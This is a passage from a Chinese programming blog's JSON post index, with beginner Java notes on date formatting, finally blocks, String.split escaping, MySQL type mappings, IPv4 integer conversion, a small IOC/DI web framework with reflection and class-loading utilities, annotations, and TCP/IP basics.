Resources Path: 用于存放xml和porperties文件，称为配置文件 Test Resources Path: 用于存放测试的配置文件 Exclude Path: 执行目录，就是编译和生成后产生文件的目录","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"}]},{"title":"Date日期格式化","date":"2016-03-19T15:00:00.000Z","path":"2016/03/20/Date日期格式化/","text":"Java中的日期Java中的日期是Date包 import java.util.Date; 其中无参数构造函数返回当前时间 Date time = new Date(); 日期格式化日期的类是Date类，如果想要变为肉眼读懂的字符串需要用text包下的格式化类 import java.text.SimpleDateFormat; 可以按照字符串规律进行格式化 SimpleDateFormat simpleDateFormat = new SimpleDateFormat(&quot;yyyyMMdd&quot;); String today = simpleDateFormat.format(new Date()); 其中年月日的用「year」 「month」 「day」 「hour」 「minute」 「second」 的首字母表示，大写M代表Month，小写m代表Minute。 public static final String DATE_SHOW_FORMAT = &quot;yyyy-MM-dd&quot;; public static final String DATE_TIME_FORMAT = &quot;yyyy-MM-dd HH:mm:ss&quot;; public static final String DATE_SHORT_FORMAT = &quot;yyyyMMdd&quot;; public static final String DATE_MONTH_FORMAT = &quot;yyyyMM&quot;; public static final String DATE_TIMEC_FORMAT = &quot;yyyyMMddHH24ssmm&quot;; public static final String DATE_TIMES_FORMAT = &quot;yyyyMMddhhmmss&quot;; public static final String DATE_TIME_FORMAT_NO_SPLIT = &quot;yyyyMMddHHmmss&quot;;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Date","slug":"Date","permalink":"http://yoursite.com/tags/Date/"}]},{"title":"Java的finally与后续代码的调用测试","date":"2016-03-19T15:00:00.000Z","path":"2016/03/20/Java的finally与后续代码的调用测试/","text":"Java的finally调用机制测试测试结论： finally会在后续代码之前进行调用 finally在Catch中向外丢出Exception之后也会执行，而函数后续代码在Exception丢出之后不会执行 测试代码Throw public void someMethod() throws Exception &#123; System.out.print(&quot;Execute Before\\n&quot;); try &#123; System.out.print(&quot;Execute Try\\n&quot;); int i = 1/0; &#125; catch (Exception e) &#123; System.out.print(&quot;Execute Catch\\n&quot;); throw e; &#125; finally &#123; System.out.print(&quot;Execute Finally\\n&quot;); &#125; System.out.print(&quot;Execute After\\n&quot;); &#125; 测试输出Throw Execute Before Execute Try Execute Catch Execute Finally 测试代码Not Throw public void someMethod() throws Exception &#123; System.out.print(&quot;Execute Before\\n&quot;); try &#123; System.out.print(&quot;Execute Try\\n&quot;); int i = 1/0; &#125; catch (Exception e) &#123; System.out.print(&quot;Execute Catch\\n&quot;); &#125; finally &#123; System.out.print(&quot;Execute Finally\\n&quot;); &#125; System.out.print(&quot;Execute After\\n&quot;); &#125; 测试输出Not Throw Execute Before Execute Try Execute Catch Execute Finally Execute After","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"}]},{"title":"Split以点分割String注意转义","date":"2016-03-19T15:00:00.000Z","path":"2016/03/20/Split以点分割String注意转义/","text":"Split的入参先去String中看看Split的函数的定义 * * @param regex * the delimiting regular expression */ public String[] split(String regex) &#123; return split(regex, 0); &#125; 可以看到其入参并不是你要作为标记的String字符串，而是一个正则表达式，而且其调用了另外一个函数，进入调用函数的细节 char ch = 0; if ( //if判断第一种情况:判断输入 ( //第一种情况的判断1 ( //判断是不是仅输入了一个字符 regex.value.length == 1 &amp;&amp; //输入字符不为以下其中一个 &quot;.$|()[&#123;^?*+\\\\&quot;.indexOf(ch = regex.charAt(0)) == -1 ) //第一种情况的判断2 || ( //输入字符为两个 regex.length() == 2 &amp;&amp; //第一个Char为两个转义 regex.charAt(0) == &#39;\\\\&#39; &amp;&amp; //第二个char字符不为0-9 (((ch = regex.charAt(1))-&#39;0&#39;)|(&#39;9&#39;-ch)) &lt; 0 &amp;&amp; //第二个char字符不为a-z ((ch-&#39;a&#39;)|(&#39;z&#39;-ch)) &lt; 0 &amp;&amp; //第二个char字符为A-Z ((ch-&#39;A&#39;)|(&#39;Z&#39;-ch)) &lt; 0 ) ) &amp;&amp; //第二种情况:为合法的char字符 (ch &lt; Character.MIN_HIGH_SURROGATE || ch &gt; Character.MAX_LOW_SURROGATE) ) ｛ //以ch字符为关键字进行偏移分割法 .... ｝else &#123; //以输入字符为正则表达式进行分割法 .... &#125; 通过总结发现 if判断为true的条件 输入字符为一位时，不为「.$|」等正则字符 输入字符为两位时，第一位为两个转义字符，第二位不为0-9或a-Z 满足以上两个条件就进行正常字符分割，否则进行正则表达式匹配 以「.」 分割所以说以点分割要避开正则表达式的判断，需要用两个转义字符，从转义字符上理解 第一个转义字符用来转义第二个转义字符 第二个转义字符用来转义点符号 例子 String str = &quot;com.alanli.io&quot; String[] strArray = str.split(&quot;\\\\.&quot;); //String[] strArray = str.split(&quot;.&quot;); //错误的方法进入了正则分割","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"RegEx","slug":"RegEx","permalink":"http://yoursite.com/tags/RegEx/"}]},{"title":"Java和MySQL中的类型对应","date":"2016-03-18T15:00:00.000Z","path":"2016/03/19/Java和MySQL中的类型对应/","text":"Java和MySQL中的类型对应Java和MySQL需要注意的是数据类型的「长度」 ，有些时候需要储存的数字过大，INT类型有可能存不下。 类型名称 显示长度 数据库类型 JAVA类型 JDBC类型索引(int) VARCHAR L+N VARCHAR java.lang.String 12 CHAR N CHAR java.lang.String 1 BLOB L+N BLOB java.lang.byte[] -4 TEXT 65535 VARCHAR java.lang.String -1 INTEGER 4 INTEGER UNSIGNED java.lang.Long 4 TINYINT 3 TINYINT UNSIGNED java.lang.Integer -6 SMALLINT 5 SMALLINT UNSIGNED java.lang.Integer 5 MEDIUMINT 8 MEDIUMINT UNSIGNED java.lang.Integer 4 BIT 1 BIT java.lang.Boolean -7 BIGINT 20 BIGINT UNSIGNED java.math.BigInteger -5 FLOAT 4+8 FLOAT java.lang.Float 7 DOUBLE 22 DOUBLE java.lang.Double 8 DECIMAL 11 DECIMAL java.math.BigDecimal 3 BOOLEAN 1 同TINYINT ID 11 PK (INTEGER UNSIGNED) java.lang.Long 4 DATE 10 DATE java.sql.Date 91 TIME 8 TIME java.sql.Time 92 DATETIME 19 DATETIME java.sql.Timestamp 93 TIMESTAMP 19 TIMESTAMP java.sql.Timestamp 93 YEAR 4 YEAR java.sql.Date 91 MySQL中Int的区别BIGINT从 -2^63 (-9223372036854775808) 到 2^63-1 (9223372036854775807) 的整型数据（所有数字）。存储大小为 8 个字节。 BIGINT已经有长度了，在mysql建表中的length，只是用于显示的位数 INT从 -2^31 (-2,147,483,648) 到 2^31 – 1 (2,147,483,647) 的整型数据（所有数字）。存储大小为 4 个字节。int 的 SQL-92 同义字为 integer。 SMALLINT从 -2^15 (-32,768) 到 2^15 – 1 (32,767) 的整型数据。存储大小为 2 个字节。 TINYINT从 0 到 255 的整型数据。存储大小为 1 字节。 INT的大坑INT的范围还是比较小的，程序中如果超过10位的数据（比如转化后的IP地址），就会超过INT类型支持的范围，所以就需要就采用BIGINT。 int(M) 在 integer 数据类型中，M 表示最大显示宽度。在 int(M) 中，M 的值跟 int(M) 所占多少存储空间并无任何关系。和数字位数也无关系 int(3)、int(4)、int(8) 在磁盘上都是占用 4 btyes 的存储空间。","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"},{"name":"Type","slug":"Type","permalink":"http://yoursite.com/tags/Type/"}]},{"title":"IPv4的数据库存储和Int类型转换","date":"2016-03-17T15:00:00.000Z","path":"2016/03/18/IPv4的数据库存储和Int类型转换/","text":"IPv4的数据库存储和Int类型转换IPv4可以以两种形式储存到数据库，第一种就是肉眼可以见的String类型，第二种就是转化为Int类型储存 //String Type String ipStr = &quot;127.0.0.1&quot; //Integer/Long Type String ipNum = 2130706433; 之所以使用数字进行储存，我觉得是因为数字读写比较快，但是IPv6貌似不能转化为数字。目前还没遇到这个问题。 转化工具Java的官方库并没有提供转化工具，所以需要借助第三方库或者自己写 手写转化工具转化String类型到Long类型，转化出来的地址是无符号的Long型，因为255.255.255.255的地址转化完是『4294967295』，大于了Integer类型的最大范围，所以数据库中要使用『BIGINT』进行储存。 public static String integerToStringIPv4(int ip) &#123; return ((ip &gt;&gt; 24 ) &amp; 0xFF) + &quot;.&quot; + ((ip &gt;&gt; 16 ) &amp; 0xFF) + &quot;.&quot; + ((ip &gt;&gt; 8 ) &amp; 0xFF) + &quot;.&quot; + ( ip &amp; 0xFF); &#125; public static Long StringIPv4ToLong(String addr) &#123; String[] addrArray = addr.split(&quot;\\\\.&quot;); long num = 0; for (int i=0;i&lt;addrArray.length;i++) &#123; int power = 3-i; num += ((Integer.parseInt(addrArray[i])%256 * Math.pow(256,power))); &#125; return num; &#125; Google库com.google.common.net.InetAddresses转化String类型到int类型，转化出来的地址是有符号的int基本类型，255.255.255.255的地址转化完是『－1』数据库中可以使用『INT』进行储存。 import com.google.common.net.InetAddresses; import java.net.InetAddress; import java.net.UnknownHostException; public static String integerToStringIPv4Google(int ip) &#123; return InetAddresses.fromInteger(ip).toString(); &#125; public static Integer StringIPv4ToIntegerGoogle(String addr) &#123; try &#123; InetAddress javaInet = InetAddress.getByName(addr) return InetAddresses.coerceToInteger(javaInet); &#125; catch (UnknownHostException e) &#123; return 0; &#125; &#125;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"},{"name":"DataBase","slug":"DataBase","permalink":"http://yoursite.com/tags/DataBase/"},{"name":"Type","slug":"Type","permalink":"http://yoursite.com/tags/Type/"}]},{"title":"Web框架学习:框架的基本工作流程","date":"2016-03-16T15:00:00.000Z","path":"2016/03/17/Web框架学习基本工作流程/","text":"WebFramework的作用WebFramework简称Web框架,比较知名的比如Spring,其主要是通过技术手段管理模块中的类的生命周期,更加有效的管理内存. 如果想要加深框架的理解,建议手动编写黄勇先生书的1-3章节,由于黄勇先生并未对具体功能做细致解释,所以这篇文章仅仅是补充作用,而且编写时一定要用JDK1.6和Tomcat7,我用JDK1.8和Jetty9代码没有跑起来….. 由于Web开发经验有限,所以整篇文章理解可能会存在谬误的地方,如果碰到,你跳进屏幕来打我呀 ㄟ&lt;(=▔.▔=)&gt;ㄏ WebFramework的技术点 JavaBean: 普通的Class,作为Model,成员变量有Get/Set方法,具有一个无参数的构造函数 反射Reflection: 一种运行时机制,本质是通过通过类名(字符串)来实例化/传参/执行函数 反转控制(Inversion of Control):一种去耦合技术,通过反射技术管理Class的生命周期 依赖注入(Dependency Injection):一种链接技术,用来对成员变量赋值(实质是链接因为IOC带来的耦合丢失) 注解(Annotation): 一种标记技术,类似于接口,框架通过这种标记技术来管理不同注解的类/变量/方法的声明周期 SmartFramework架构图除了Spring这种常用的框架外,阿里巴巴黄勇的书提出了一个观点,应该首先了解框架怎么运作,再去学习框架,从而获得更加清醒的认识.本人由于是初学Java,所以先根据其书1-3章,重现了其轻量级框架SmartFramework,并且进行了一定的总结. 首先进行一些准备工作 SmartFramework工具类整个框架除了主流程之外还使用到了以下工具类 类加载工具: ClassUtil 反射工具: ReflectionUtil 常用工具 常用工具中包括:字符串转换/容器是否为空判断/Json编码解码/URL编码解码/数据流编码解码/配置文件读取 SmartFramework注解注解的详细介绍见另一篇文章,SmartFramework四个注解 Action: 注解网络层用于接收HTTP的Request和Post请求的Handler函数 Controller: 注解网络层用于要对Request的进行处理的Class类 Service: 注解Java层用于逻辑处理Object的Class类,如和数据库息息相关的DAO类等 Inject: 注解Java层Controller中需要的Service类,进行依赖注入 四个注解的ElementType分别是Action(Method),Controller(TYPE),Service(TYPE),Inject(Field). SmartFrameworkBean类Bean类共有五个,其中框架类的两个 Request: 存储两个String类型成员变量RequestMethod/RequestPath Handler: 存储Class类型的ControllerClass,存储Method的类型的HandlerMethod 前端类3个 Data: 一个Object对象,用于储存Json类等数据的Object View: 一个String类型的页面JSP地址Path,一个Map类型的Model,用于接收ParamMap Param: 储存一个Map类型的ParamMap,Key为String类型参数名,Value为Object类型的参数值 SmartFramework工作流程以下是工作流程图 静态启动(Static Init) 首先把整个框架的入口放在HttpServlet 重写Init函数,以便于HttpServlet启动进行执行 使用类加载工具把所有的HelperClass进行顺序类加载 以下是HttpServlet代码示例 @Override public void init(ServletConfig servletConfig) throws ServletException &#123; HelperLoader.init(); ..... &#125; 通过HelperLoader进行循环加载 public static void init() &#123; Class&lt;?&gt;[] classList = &#123; ClassHelper.class, BeanHelper.class, InjectHelper.class, ControllerHelper.class &#125;; for (Class&lt;?&gt; cls: classList) &#123; ClassUtil.loadClass(cls.getName(),false); &#125; &#125; 所有的Helper变量都拥有两个部分 静态变量容器: 一个静态变量用于存放静态代码获取到的Object 静态代码: 保证在类加载后静态代码被马上执行,并且把数据存放到静态成员变量 类加载(Class Load) 首选获取到类加载线程Tread 遍历文件夹/Jar包/.class文件取出加载了框架的所有Class 使用类加载工具把所有Class放入ClassSet 通过Tread加载Set中所有的类 ClassHelper静态变量和静态区代码 private static final Set&lt;Class&lt;?&gt;&gt; CLASS_SET; static &#123; String basePackage = ConfigHelper.getAppBasePackage(); CLASS_SET = ClassUtil.getClassSet(basePackage); &#125; 反转控制(Bean IOC) 通过BeanHelper获取到所有的BeanClassName,准备一个BeanMap备用 然后利用反射工具ReflectionUtil对所有的Bean进行实例化 实例化包含Controller注解的Bean 实例化包含Service注解的Bean 以Class作为Key值,实例的Object作为Value放入BeanMap BeanHelper静态变量和静态代码 private static final Map&lt;Class&lt;?&gt;, Object&gt; BEAN_MAP = new HashMap&lt;Class&lt;?&gt;, Object&gt;(); static &#123; Set&lt;Class&lt;?&gt;&gt; beanClassSet = ClassHelper.getBeanClassSet(); for (Class&lt;?&gt; beanClass : beanClassSet) &#123; Object obj = ReflectionUtil.newInstance(beanClass); BEAN_MAP.put(beanClass,obj); &#125; &#125; 依赖注入(Inject)黄勇先生在书中将依赖注入放入了Iochelper.java,个人认为是黄勇先生在一开始就混淆了依赖注入和控制反转的概念,所以我将该文件称为InjectHelper 遍历BeanMap的取出Key和Value 对每一个Key进行class.getDeclaredFields()取出所有Field 检查Field是不是含有Inject注解 存在Inject注解的通过Field.getType()得到FieldClass 以FieldClass作为Key去BeanMap查找,看是否存在已经被IOC实例化的对象 存在实例通过反射工具ReflectionUtil进行依赖注入 InjectHelper的静态区代码 public final class InjectHelper &#123; static &#123; //Get All Bean Class And Bean Instance Map&lt;Class&lt;?&gt;, Object&gt; beanMap = BeanHelper.getBeanMap(); if(CollectionUtil.isNotEmpty(beanMap)) &#123; //一级遍历Bean Map for (Map.Entry&lt;Class&lt;?&gt;,Object&gt;beanEntry : beanMap.entrySet()) &#123; //获取Bean类和实例 Class&lt;?&gt; beanClass = beanEntry.getKey(); Object beanInstance = beanEntry.getValue(); //获取一级遍历中每个Bean类所定义的成员变量Bean Field Field[] beanFields = beanClass.getDeclaredFields(); if (ArrayUtil.isNotEmpty(beanFields)) &#123; //对Bean Fields进行二级遍历 for (Field beanField : beanFields) &#123; //检查存在Inject注解的Field(备注1) if (beanField.isAnnotationPresent(Inject.class)) &#123; Class&lt;?&gt; beanFieldClass = beanField.getType(); Object beanFieldInstance = beanMap.get(beanFieldClass); //BeanMap中存在已经被IOC实例化的对象 if (beanFieldInstance !=null) &#123; //进行依赖注入,重新链接被IOC切断的耦合 ReflectionUtil.setField(beanInstance,beanField,beanFieldInstance); &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; 依赖注入中最关键的是备注1,其配合IOC中第三第四步来共同使用 IOC中进行实例化的有Controller注解的类,也有Service注解的类 Service注解的类一般是作为Controller注解的类的成员变量,并且打上了Inject注解 由于JavaBean的无参数构造特性,Controller中的Service成员变量此时指向null 而BeanMap中又存在Service类的实例 依赖注入就是通过Field.set(ControllerObject, ServiceObject)进行注入 将Controller中的Service成员变量的指针指向BeanMap中的ServiceObject 由于控制反转(IOC)经常和依赖注入(DI)经常配合使用,所以好多将两者混为一谈,其实并不是这样.IOC是一种去耦合手段,而DI则是从新链接耦合的手段 请求映射(RequestMap)按照思维逻辑每一个请求(Request)都是调用一个服务端功能,而去接收并处理这个请求的就是一个接收的方法(Handler),这一步就是将前端被标有Action注解的方法(Method)对应到每个请求的URL地址上. 使用一个静态变量ActionMap保存映射关系,Request为Key,Handler为Value 遍历带有Controller注解的Bean,并且遍历其中带有Action注解的Method方法 分析Action中的value方法的字符串,取出RequestMethod和RequestURL 使用RequestMthod和RequestURL实例化Request对象 使用Controller的Class和其Method实例化Handler对象 把对应的Request和Handler放入ActionMap ControllerHelper的静态代码 public class ControllerHelper &#123; private static final Map&lt;Request,Handler&gt; ACTION_MAP = new HashMap&lt;Request, Handler&gt;(); static &#123; //获取所有的ControllerClass Set&lt;Class&lt;?&gt;&gt; controllerClassSet = ClassHelper.getControllerClassSet(); if (CollectionUtil.isNotEmpty(controllerClassSet)) &#123; //一级遍历ControllerClass for(Class&lt;?&gt; controllerClass : controllerClassSet) &#123; //取出一级遍历中的所有Method Method[] methods = controllerClass.getMethods(); if (ArrayUtil.isNotEmpty(methods)) &#123; //二级遍历Method for (Method method : methods) &#123; //查询带有Action注解的Method if (method.isAnnotationPresent(Action.class)) &#123; Action action = method.getAnnotation(Action.class); String mapping = action.value(); //分析Method中value的组成 if(mapping.matches(&quot;\\\\w+:/\\\\w*&quot;)) &#123; String[] array = mapping.split(&quot;:&quot;); if (ArrayUtil.isNotEmpty(array) &amp;&amp; array.length == 2) &#123; String requestMethod = array[0]; String requestPath = array[1]; //实例化Request和Handler Request request = new Request(requestMethod,requestPath); Handler handler = new Handler(controllerClass,method); //放入映射关系ActionMap ACTION_MAP.put(request, handler); &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; 请求响应(HTTP Response)在SmartFramework框架搭建好之后,可以通过Jar包或者Maven的形式加入新的Project.在新的Project中使用需要遵循以下方案 使用Controller注解标记出要对请求响应的类 使用Service注解标记出后台实际处理请求的类 使用Inject注解标记出Controller中引入用来处理事务的Service类 使用Action标记出Controller中响应方法 Action方法需要遵循使用了ParamBean的参数 Action返回一个ViewBean或者DataBean(见SmartFrameworkBean讲解) 新ProjectController举例,Controller是Servlet的一个延伸,主要是处理HTTP请求中的逻辑关系 @Controller public class TestController &#123; //此处对Service的Class进行注入,ServiceClass由IOC实例化 @Inject private TestService testService; //返回一个DataBean @Action(&quot;get:/outputString&quot;) public Data doTest(Param param) &#123; String string = testService.outputString(); return new Data(string); &#125; //返回一个ViewBean @Action(&quot;get:/index&quot;) public View doIndex(Param param) &#123; return new View(&quot;index.jsp&quot;); &#125; &#125; 新ProjectService举例,Service是实际后台的逻辑,处理数据库操作等事务并作为一个Model被Controller引用 @Service public class TestService &#123; public String outputString() &#123; String string = &quot;Test Service Done&quot;; return string; &#125; &#125; 框架的总结根据文章Servlet的总结每一个HTTP请求都需要一个Servlet进行接收,这样的话会导致需要编写大量的Servlet让代码冗余不堪,而且每一个Servlet都需要一个实例占用内存导致资源浪费,而框架就可以解决这些问题. 框架将Servlet类作为入口,让Servlet作为转发器,分析请求并找到对应的Handler方法 框架通过反转控制和依赖注入保障了所有的Class在内存中只存在一个实例(单例模式),节省了内存 框架定义好了Bean,使用这些Bean规范化了参数和返回的Object 框架提供了一系列工具类 由于框架的这些处理,使得接口的开发更加清晰,而且类似于内存和生命周期的管理等复杂问题则不需要程序员考虑. 框架的AOP框架还有一个重要的特性是AOP,面向切面的编程,由于是初步学习,准备等实际业务能力上来之后再来体会其中的奥妙 个人感想以往在写前端的时候,自己思考过一种单例模式,万万没想到啊,后台框架这种反转控制和依赖注入把内存玩的这么溜,真是大开眼界.","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Architecture","slug":"Architecture","permalink":"http://yoursite.com/tags/Architecture/"}]},{"title":"Web框架学习:反射工具","date":"2016-03-15T15:00:00.000Z","path":"2016/03/16/Web框架学习反射工具/","text":"反射的作用在Web框架中,反转控制(IOC)的实例化,依赖注入的赋值以及接口Handle函数的触发都是利用了反射机制,如同OC的字符串反射一样,Java里的反射也是通过类或Class进行内存的运行时(Runtime)操作. 反射的三个基本类在Smart框架中,反射用到三个概念 Instance: 实例class.newInstance()来新建实例 Field: 成员变量field.set(Instance,value)来对具体实例的成员变量赋值 Method: 成员方法,使用method.invoke(Instance,args)触发某个成员方法 Example-ReflectionUtilpackage org.smart4j.framework.util; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class ReflectionUtil &#123; private static final Logger LOGGER = LoggerFactory.getLogger(ReflectionUtil.class); public static Object newInstance(Class&lt;?&gt; cls) &#123; Object instance = null; try &#123; instance = cls.newInstance(); &#125; catch (InstantiationException e) &#123; LOGGER.error(&quot;new instance failure&quot;,e); throw new RuntimeException(e); &#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); &#125; return instance; &#125; public static Object invokeMethod(Object obj, Method method, Object args) &#123; Object result = null; try &#123; method.setAccessible(true); result = method.invoke(obj,args); &#125; catch (IllegalAccessException e) &#123; LOGGER.error(&quot;invoke method failure&quot;,e); throw new RuntimeException(e); &#125; catch (InvocationTargetException e) &#123; e.printStackTrace(); &#125; return result; &#125; public static void setField(Object obj, Field field, Object value) &#123; try &#123; field.setAccessible(true); field.set(obj, value); &#125; catch (IllegalAccessException e) &#123; LOGGER.error(&quot;set field failure&quot;,e); throw new RuntimeException(e); &#125; &#125; &#125;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Architecture","slug":"Architecture","permalink":"http://yoursite.com/tags/Architecture/"},{"name":"Reflect","slug":"Reflect","permalink":"http://yoursite.com/tags/Reflect/"}]},{"title":"Web框架学习:注解的使用","date":"2016-03-15T15:00:00.000Z","path":"2016/03/16/Web框架学习注解的使用/","text":"注解是什么注解是Java5中提出对代码进行管理的一种方式,其相当于备注的作用.在Web框架中使用注解对使用框架的类/方法/变量进行管理. 注解的定义如果你想自己定义一个注解,需要使用到元注解(Meta-Annotation),元注解共有4个,有Java源生提供. @Target: 标记了该注解用于注解什么元素,注解类?方法?变量? @Retention: 标记了该注解能够生效到哪个声明周期 @Documented: 标记了该注解的成员是否被当作一个公共的API @Inherited: 标记了该注解是否可以被继承 在四个元注解中,Target和Retention是最常使用的,而后两个是可选的. @Target@Target说明了Annotation所修饰的对象范围,就是该注解可以用在什么地方,有的只能作用于类,而有的只能作用于方法等等.取值(ElementType)有： CONSTRUCTOR: 用于描述构造函数 FIELD: 用于描述Class里的成员变量 LOCAL_VARIABLE: 用于描述Method方法中的局部变量 METHOD: 用于描述Class中的函数方法 PACKAGE: 用于描述包 PARAMETER: 用于描述参数 TYPE:用于描述类Class、接口(包括注解类型本身)Interface 或enum声明 @Retention@Retention定义了该Annotation被保留的时间长短,表示需要在什么级别保存该注解信息，用于描述注解的生命周期 1.SOURCE: 在Java源文件中有效（即到了Class文件就没了）2.CLASS: 在Class文件中有效（即加载到内存就没了）3.RUNTIME: 在运行时有效（到了内存要执行了还有） 这个就比较容易理解,一般框架中都是RUNTIME,因为都是动态去分析这些注解. 注解的成员由于注解的载体(表现形式)是一种接口Interface,所以说要遵循接口的一些规则,其内部变量都是以函数形式存在,比如以下这个自定义注解 Custom是用于注解Class的一个注解,其声明周期可以存活到内存中的运行时 @Target(ElementType.TYPE) @Retention(RetentionPolicy.RUNTIME) public @interface Custom &#123; //String value default &quot;value&quot;; //错误的定义使用成员值 String value() default &quot;value&quot;; //正确的定义使用函数 String name() default &quot;className&quot;; &#125; 如果想要定义一个值来保存字符串,必须使用value()函数形式,而不是value这种成员值. 注解成员的赋值在使用注解时,可以对注解的成员进行赋值,如果不赋值则取default值 @Custom(value = &quot;new value&quot;, name = &quot;new name&quot;) 根据Java文档如果不适用指定成员的赋值,则是对value成员赋值 //If there is just one element named value, then the name can be omitted @Custom(&quot;new value&quot;) 参考文献1.注解（Annotation）自定义注解入门","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Architecture","slug":"Architecture","permalink":"http://yoursite.com/tags/Architecture/"}]},{"title":"Web框架学习:类加载工具","date":"2016-03-15T15:00:00.000Z","path":"2016/03/16/Web框架学习类加载工具/","text":"Java的类加载机制Java的代码都是运行在JVM虚拟机中的,使用类加载机制来完成代码的运行,具体内容还不是很了解,但是类加载机制总需要有一个线程来操作,Web框架中的类加载工具就是获取到这个线程,并把框架里的类加载进去. 类加载工具流程 新建一个HashSet存放Class 通过File文件目录/jar包/“.class”文件三种方式遍历取出Class 获取到类加载线程进行加载 Examplepackage org.smart4j.framework.util; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import org.smart4j.framework.util.tool.StringUtil; import java.io.File; import java.io.FileFilter; import java.io.IOException; import java.net.JarURLConnection; import java.net.URL; import java.util.Enumeration; import java.util.HashSet; import java.util.Set; import java.util.jar.JarEntry; import java.util.jar.JarFile; public final class ClassUtil &#123; private static final Logger LOGGER = LoggerFactory.getLogger(ClassUtil.class); public static Set&lt;Class&lt;?&gt;&gt; getClassSet (String packageName) &#123; //init a Classset Set&lt;Class&lt;?&gt;&gt; classSet = new HashSet&lt;Class&lt;?&gt;&gt;(); //loop for find Class try &#123; Enumeration&lt;URL&gt; urls = getClassLoader().getResources(packageName.replace(&quot;.&quot;,&quot;/&quot;)); while (urls.hasMoreElements()) &#123; URL url = urls.nextElement(); if (url != null) &#123; String protocol = url.getProtocol(); if (protocol.equals(&quot;file&quot;)) &#123; String packagePath = url.getPath().replaceAll(&quot;%20&quot;,&quot; &quot;); addClass(classSet, packagePath,packageName); &#125;else if (protocol.equals(&quot;jar&quot;)) &#123; JarURLConnection jarURLConnection = (JarURLConnection)url.openConnection(); if (jarURLConnection != null) &#123; JarFile jarFile = jarURLConnection.getJarFile(); if (jarFile != null) &#123; Enumeration&lt;JarEntry&gt; jarEnties = jarFile.entries(); while (jarEnties.hasMoreElements()) &#123; JarEntry jarEntry = jarEnties.nextElement(); String jarEntryName = jarEntry.getName(); if (jarEntryName.endsWith(&quot;.class&quot;)) &#123; String className = jarEntryName.substring(0, jarEntryName.lastIndexOf(&quot;.&quot;)).replaceAll(&quot;/&quot;,&quot;.&quot;); doAddClass(classSet,className); &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; catch (IOException e) &#123; LOGGER.error(&quot;get class set failure&quot;, e); throw new RuntimeException(e); &#125; //return ClassSet return classSet; &#125; private static void doAddClass(Set&lt;Class&lt;?&gt;&gt; classSet, String className) &#123; Class&lt;?&gt; cls = loadClass(className, false); classSet.add(cls); &#125; private static void addClass(Set&lt;Class&lt;?&gt;&gt; classSet, String packagePath, final String packageName) &#123; final File[] files = new File(packagePath).listFiles(new FileFilter() &#123; public boolean accept(File pathname) &#123; return (pathname.isFile() &amp;&amp; pathname.getName().endsWith(&quot;.class&quot;))|| pathname.isDirectory(); &#125; &#125;); for (File file: files) &#123; //Get File name String fileName = file.getName(); // if (file.isFile()) &#123; String className = fileName.substring(0,fileName.lastIndexOf(&quot;.&quot;)); if (StringUtil.isNotEmpty(packageName)) &#123; className = packageName+&quot;.&quot;+className; &#125; doAddClass(classSet, className); &#125;else &#123; String subPackagePath = fileName; if (StringUtil.isNotEmpty(packagePath)) &#123; subPackagePath = packagePath + &quot;/&quot; + subPackagePath; &#125; String subPackageName = fileName; if (StringUtil.isNotEmpty(packageName)) &#123; subPackageName = packageName + &quot;.&quot; +subPackageName; &#125; addClass(classSet, subPackagePath, subPackageName); &#125; &#125; &#125; public static Class&lt;?&gt; loadClass(String className, boolean isInitialized) &#123; Class&lt;?&gt; cls; try &#123; cls = Class.forName(className,isInitialized, getClassLoader()); &#125; catch (ClassNotFoundException e) &#123; LOGGER.error(&quot;load class failure&quot;,e); throw new RuntimeException(e); &#125; return cls; &#125; public static ClassLoader getClassLoader() &#123; return Thread.currentThread().getContextClassLoader(); &#125; &#125;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Architecture","slug":"Architecture","permalink":"http://yoursite.com/tags/Architecture/"}]},{"title":"TCP/IP和Socket的关系","date":"2016-03-14T15:00:00.000Z","path":"2016/03/15/TCPIP和Socket的关系/","text":"TCP/IP是什么TCP/IP是什么要是讲清楚,我能对着计算机网络书抄出一本书这么厚,所以这里就言简意赅的总结下实用的体会,从计算机基础开始推论 根据理想化计算机网络模型,应该分为7层(哪七层去查书) 实际上的操作中是分为了4层(哪四层也去查书) 在传输层需要通过协议来真正的传输二进制数据(数据流) 就像打电话一样需要电话号码和有人接通 IP协议就是电话号码的作用 TCP协议就是检查是否接通的作用 广义的TCP/IP协议簇是指4层计算机分层中,每一层的作用和其具体使用的协议,而狭义的TCP/IP就是指这两个协议 TCP协议: Transmission Control Protocol IP协议: Internet Protocol TCP/IP怎么用IP协议最常见的就是IPv4,首先来讲IP协议重要的两个部分 地址: 相当于电话号码,具体哪一台计算机 端口: 相当于接听人,具体需要计算机中的哪个程序来接收数据 当我们知道了要打电话到哪里(地址),找哪个人接听(端口),此时就需要TCP协议来确定这个人在不在(链接是否建立),就是经常听到的三次握手,三次握手的通俗解释 A打电话到B: 滴滴滴,B你在不在(第一次握手) B听到铃声: 拿起电话大喊一声,老子在这呢(第二次握手) A听到B的大喊: 听到大喊后,先寒暄一句原来你小子在家啊(第三次握手) 开始聊天(传输数据) 由此可见TCP/IP协议其实是两个不同的东西,IP协议本身并没有传输数据的功能,而且也不具备连接性,是一种定位手段,而TCP的三次握手才是数据传输的作用 